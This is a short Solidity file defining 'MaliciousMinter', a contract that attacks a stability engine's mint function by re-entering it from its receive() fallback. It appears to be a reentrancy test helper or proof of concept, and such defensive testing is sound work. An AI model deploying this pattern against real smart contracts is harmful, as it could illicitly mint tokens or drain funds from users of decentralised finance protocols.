// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IStabilityEngine {
    function mint(uint256 _amount) external payable;
}

contract MaliciousMinter {
    IStabilityEngine public target;
    bool public attacking;

    constructor(address _target) {
        target = IStabilityEngine(_target);
    }

    function attack() external payable {
        attacking = true;
        target.mint{value: msg.value}(100 * 1e18);
    }

    receive() external payable {
        if (attacking) {
            attacking = false;
            target.mint{value: msg.value}(100 * 1e18);
        }
    }
}
